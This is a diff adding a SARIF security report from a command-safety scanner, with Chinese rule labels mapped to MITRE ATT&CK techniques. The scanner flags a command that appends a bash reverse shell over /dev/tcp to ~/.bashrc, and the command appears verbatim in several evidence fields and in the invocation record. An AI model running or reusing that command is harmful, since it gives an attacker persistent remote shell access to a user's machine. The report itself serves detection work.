@@ -1,0 +1,185 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Command Safety Analyzer",
+          "version": "4.1",
+          "informationUri": "https://github.com/command-safety-analyzer",
+          "rules": [
+            {
+              "id": "T1059.004",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: reverse shell via /dev/tcp"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            },
+            {
+              "id": "T1059.004-1",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: interactive bash reverse shell"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            },
+            {
+              "id": "T1546.004",
+              "name": "Shell环境",
+              "shortDescription": {
+                "text": "Shell 配置文件被修改"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1546/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1546.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1546.004 (Event Triggered Execution: .bash_profile/.bashrc)"
+              }
+            },
+            {
+              "id": "T1059.004-3",
+              "name": "内容分析",
+              "shortDescription": {
+                "text": "Shell 配置含恶意内容: reverse shell via /dev/tcp"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            },
+            {
+              "id": "T1059.004-4",
+              "name": "内容分析",
+              "shortDescription": {
+                "text": "Shell 配置含恶意内容: interactive bash reverse shell"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1059.004"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+              }
+            }
+          ],
+          "properties": {
+            "verdict": "DANGEROUS",
+            "risk_score": 100,
+            "confidence": "HIGH"
+          }
+        }
+      },
+      "results": [
+        {
+          "ruleId": "T1059.004",
+          "level": "error",
+          "message": {
+            "text": "命令匹配恶意模式: reverse shell via /dev/tcp"
+          },
+          "properties": {
+            "risk_score": 40,
+            "dimension": "静态分析",
+            "evidence": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"
+          }
+        },
+        {
+          "ruleId": "T1059.004-1",
+          "level": "error",
+          "message": {
+            "text": "命令匹配恶意模式: interactive bash reverse shell"
+          },
+          "properties": {
+            "risk_score": 45,
+            "dimension": "静态分析",
+            "evidence": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"
+          }
+        },
+        {
+          "ruleId": "T1546.004",
+          "level": "warning",
+          "message": {
+            "text": "Shell 配置文件被修改"
+          },
+          "properties": {
+            "risk_score": 20,
+            "dimension": "Shell环境"
+          }
+        },
+        {
+          "ruleId": "T1059.004-3",
+          "level": "error",
+          "message": {
+            "text": "Shell 配置含恶意内容: reverse shell via /dev/tcp"
+          },
+          "properties": {
+            "risk_score": 40,
+            "dimension": "内容分析",
+            "evidence": "reverse shell via /dev/tcp"
+          }
+        },
+        {
+          "ruleId": "T1059.004-4",
+          "level": "error",
+          "message": {
+            "text": "Shell 配置含恶意内容: interactive bash reverse shell"
+          },
+          "properties": {
+            "risk_score": 45,
+            "dimension": "内容分析",
+            "evidence": "interactive bash reverse shell"
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "properties": {
+            "command": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc",
+            "verdict": "DANGEROUS",
+            "risk_score": 100,
+            "confidence": "HIGH",
+            "timestamp": "2026-03-20T03:46:31.470942+00:00"
+          }
+        }
+      ]
+    }
+  ]
+}
